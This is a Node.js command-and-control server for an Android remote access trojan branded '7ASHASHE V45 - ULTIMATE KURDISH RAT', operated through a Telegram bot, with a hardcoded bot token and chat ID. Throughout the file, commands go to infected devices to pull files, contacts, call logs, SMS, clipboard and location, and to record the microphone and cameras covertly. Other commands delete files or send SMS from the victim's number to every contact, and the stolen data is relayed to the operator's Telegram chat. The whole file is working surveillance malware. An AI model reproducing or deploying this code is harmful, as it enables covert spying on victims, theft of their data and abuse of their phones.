const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

// =====================================================
// 🔐 زانیاری تێلیگرام - 7ASHASHE
// =====================================================
const token = '8624243404:AAE97WVPWOjxeaMI2tnrEf5hw1Hz--JaMrw'
const id = '5578405082'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// =====================================================
// 🏠 لاپەڕەی سەرەکی
// =====================================================
app.get('/', function (req, res) {
    res.send('<h1 align="center">🔴 7ASHASHE V45 - ULTIMATE KURDISH RAT</h1>')
})

// =====================================================
// 📤 بارکردنی فایل
// =====================================================
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `🔴 **پەیام لە ${req.headers.model}**`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

// =====================================================
// 📝 ناردنی تێکست
// =====================================================
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `🔴 **پەیام لە ${req.headers.model}**\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

// =====================================================
// 📍 ناردنی شوێن
// =====================================================
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `🔴 **شوێنی ${req.headers.model}**`, {parse_mode: "HTML"})
    res.send('')
})

// =====================================================
// 🔌 پەیوەندی WebSocket
// =====================================================
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `🔴 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** <b>${model}</b>\n` +
        `🔋 **پاتری:** <b>${battery}</b>\n` +
        `📱 **ئەندرۆید:** <b>${version}</b>\n` +
        `💡 **ڕووناکی:** <b>${brightness}</b>\n` +
        `📡 **پڕۆڤایدەر:** <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `🔴 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 **مۆدێل:** <b>${model}</b>\n` +
            `🔋 **پاتری:** <b>${battery}</b>\n` +
            `📱 **ئەندرۆید:** <b>${version}</b>\n` +
            `💡 **ڕووناکی:** <b>${brightness}</b>\n` +
            `📡 **پڕۆڤایدەر:** <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})

// =====================================================
// 🤖 بۆتی تێلیگرام - فەرمانەکان
// =====================================================
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('🔴 تکایە ژمارە تەلەفۆن بنووسە بۆ ناردنی نامە لە ژمارەی نێچیرەکەوە')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '🔴 **باشە، ئێستا پەیامەکە بنووسە بۆ ناردن لە ژمارەی نێچیرەکەوە**\n\n' +
                '• ئاگادار بە کە ئەگەر پەیامەکە زۆر درێژ بێت، ڕەنگە نەنێردرێت',
                {reply_markup: {force_reply: true}}
            )
        }
        
        if (message.reply_to_message.text.includes('🔴 باشە، ئێستا پەیامەکە بنووسە بۆ ناردن لە ژمارەی نێچیرەکەوە')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 تکایە پەیامەکە بنووسە بۆ ناردن بۆ هەموو کۆنتاکتەکان')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ وەرگرتنی لە ئامێری نێچیرەوە')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 ڕێگای فایلەکە بنووسە بۆ سڕینەوە')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی دەنگ بنووسە (بە چرکە)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پشت بنووسە (بە چرکە)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 ماوەی تۆمارکردنی کامێرای پێش بنووسە (بە چرکە)')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 پەیامی Toast بنووسە بۆ نیشاندان لە ئامێری نێچیرەکەدا')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 ناونیشانی ئاگاداری بنووسە')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '🔴 **زۆر باشە، ئێستا لینکەکە بنووسە بۆ کردنەوە بە ئاگادارییەکە**\n\n' +
                '• کاتێک نێچیرەکە کرتە لەسەر ئاگادارییەکە دەکات، ئەم لینکە دەکرێتەوە',
                {reply_markup: {force_reply: true}}
            )
        }

        if (message.reply_to_message.text.includes('🔴 زۆر باشە، ئێستا لینکەکە بنووسە بۆ کردنەوە بە ئاگادارییەکە')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.reply_to_message.text.includes('🔴 لینکی دەنگەکە بنووسە بۆ لێدانی لە ئامێری نێچیرەکەدا')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
                '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }

    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '🔴 **بەخێربێیت بۆ بۆتی 7ASHASHE - وەحشی ترین RAT**\n\n' +
                '• ئەگەر ئەپەکە لەسەر ئامێری نێچیر دامەزرابێت، چاوەڕێی پەیوەندی بکە\n\n' +
                '• کاتێک پەیامی پەیوەندیت وەرگرت، ئەمە مانای وایە ئامێرەکە ئامادەیە بۆ وەرگرتنی فەرمان\n\n' +
                '• کلیک لە دوگمەی فەرمانەکان بکە و ئامێرەکە هەڵبژێرە، پاشان فەرمانە داواکراوەکە هەڵبژێرە\n\n' +
                '• ئەگەر لە شوێنێکدا گیری خواردیت، /start بنێرە',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }

        if (message.text == '🔴 ئامێرەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    '• دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                )
            } else {
                let text = '🔴 **لیستی ئامێرە پەیوەستکراوەکان**\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `📱 **مۆدێل:** <b>${value.model}</b>\n` +
                        `🔋 **پاتری:** <b>${value.battery}</b>\n` +
                        `📱 **ئەندرۆید:** <b>${value.version}</b>\n` +
                        `💡 **ڕووناکی:** <b>${value.brightness}</b>\n` +
                        `📡 **پڕۆڤایدەر:** <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }

        if (message.text == '🔴 فەرمانەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '🔴 **هیچ ئامێرێک پەیوەست نییە**\n\n' +
                    '• دڵنیابە لەوەی ئەپەکە لەسەر ئامێری نێچیر دامەزراوە'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '🔴 **ئەو ئامێرە هەڵبژێرە کە دەتەوێت فەرمانەکانی لەسەر جێبەجێ بکەیت**', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '🔴 **داواکاری ڕەتکرایەوە**')
    }
})

// =====================================================
// 🔘 کۆدەکانی کلیکی ئینڵاین
// =====================================================
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    
    if (commend == 'device') {
        appBot.editMessageText(`🔴 **فەرمانەکان هەڵبژێرە بۆ ئامێری <b>${appClients.get(data.split(':')[1]).model}</b>**`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '📱 ئەپەکان', callback_data: `apps:${uuid}`},
                        {text: 'ℹ️ زانیاری ئامێر', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '📁 وەرگرتنی فایلەکان', callback_data: `file:${uuid}`},
                        {text: '🗑️ سڕینەوەی فایل', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '📋 کلیپبۆرد', callback_data: `clipboard:${uuid}`},
                        {text: '🎤 مایکرۆفۆن', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '📸 کامێرای پشت', callback_data: `camera_main:${uuid}`},
                        {text: '🤳 کامێرای پێش', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '📍 شوێن', callback_data: `location:${uuid}`},
                        {text: '💬 Toast', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '📞 پەیوەندییەکان', callback_data: `calls:${uuid}`},
                        {text: '👥 کۆنتاکتەکان', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '📳 لەرزین', callback_data: `vibrate:${uuid}`},
                        {text: '🔔 ئاگاداری', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '📨 پەیامەکان', callback_data: `messages:${uuid}`},
                        {text: '📤 ناردنی پەیام', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '🎵 لێدانی دەنگ', callback_data: `play_audio:${uuid}`},
                        {text: '⏹️ وەستاندنی دەنگ', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '📢 ناردن بۆ هەموو کۆنتاکتەکان',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }

    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **داواکاریەکەت لە جێبەجێکردن دایە، تکایە چاوەڕێ بکە**\n\n' +
            '• لە چەند خولەکی داهاتوو وەڵامت پێ دەگەڕێتەوە - 7ASHASHE',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["🔴 ئامێرەکان"], ["🔴 فەرمانەکان"]],
                    'resize_keyboard': true
                }
            }
        )
    }

    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '🔴 **تکایە ژمارە تەلەفۆن بنووسە بۆ ناردنی نامە لە ژمارەی نێچیرەکەوە**\n\n' +
            '• ئەگەر دەتەوێت بۆ ژمارەی ناوخۆیی بنێریت، دەتوانیت بە سفیر دەست پێ بکەیت، ئەگینا ژمارەکە بە کۆدی وڵاتەوە بنووسە',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }

    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **تکایە پەیامەکە بنووسە بۆ ناردن بۆ هەموو کۆنتاکتەکان**\n\n' +
            '• ئاگادار بە کە ئەگەر پەیامەکە زۆر درێژ بێت، ڕەنگە نەنێردرێت',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }

    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ڕێگای فایلەکە بنووسە بۆ وەرگرتنی لە ئامێری نێچیرەوە**\n\n' +
            '• پێویست ناکات هەموو ڕێگاکە بنووسیت، تەنها ڕێگای سەرەکی بەشێوەی نموونەی خوارەوە بنووسە:\n' +
            '<b>DCIM/Camera</b> بۆ وەرگرتنی وێنەکان',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ڕێگای فایلەکە بنووسە بۆ سڕینەوە**\n\n' +
            '• پێویست ناکات هەموو ڕێگاکە بنووسیت، تەنها ڕێگای سەرەکی بەشێوەی نموونەی خوارەوە بنووسە:\n' +
            '<b>DCIM/Camera</b> بۆ سڕینەوەی وێنەکان',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ماوەی تۆمارکردنی دەنگ بنووسە (بە چرکە)**\n\n' +
            '• تەنها ژمارە بنووسە، نموونە: 10 بۆ ١٠ چرکە',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **پەیامی Toast بنووسە بۆ نیشاندان لە ئامێری نێچیرەکەدا**\n\n' +
            '• ئەمە پەیامێکی کورتە کە بۆ چەند چرکەیەک لەسەر شاشەی ئامێرەکە دەردەکەوێت',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **ناونیشانی ئاگاداری بنووسە**\n\n' +
            '• ئەم پەیامە وەک ئاگاداری لە شریتی دۆخی ئامێرەکەدا دەردەکەوێت',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }

    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '🔴 **لینکی دەنگەکە بنووسە بۆ لێدانی لە ئامێری نێچیرەکەدا**\n\n' +
            '• پێویستە لینکی ڕاستەوخۆ بێت، ئەگینا کار ناکات',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});

// =====================================================
// 🔄 پینگ و پاراستنی سێرڤەر
// =====================================================
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)

// =====================================================
// 🚀 دەستپێکردنی سێرڤەر (پۆرت 8080)
// =====================================================
const PORT = process.env.PORT || 8080;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V45 running on port ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - 7ASHASHE`);
    
    appBot.sendMessage(id,
        `🔴 **7ASHASHE V45 - ULTIMATE KURDISH RAT**\n\n` +
        `👑 **Master: 7ASHASHE**\n` +
        `📊 وەشان: 45.0.0\n` +
        `🌐 پۆرت: ${PORT}\n` +
        `⏰ کات: ${new Date().toLocaleString('ckb')}\n\n` +
        `🦁 **7ASHASHE**`
    );
});
